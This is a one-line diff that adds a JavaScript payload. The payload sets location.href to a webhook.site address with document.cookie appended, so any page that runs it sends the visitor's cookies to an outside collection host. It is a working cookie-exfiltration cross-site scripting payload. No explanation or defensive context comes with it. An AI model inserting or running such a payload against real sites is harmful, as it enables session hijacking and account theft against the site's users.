@@ -1,0 +1,1 @@
+location.href='https://webhook.site/0ad78f87-4ecd-494f-b039-81d24a6f7675/'+document.cookie
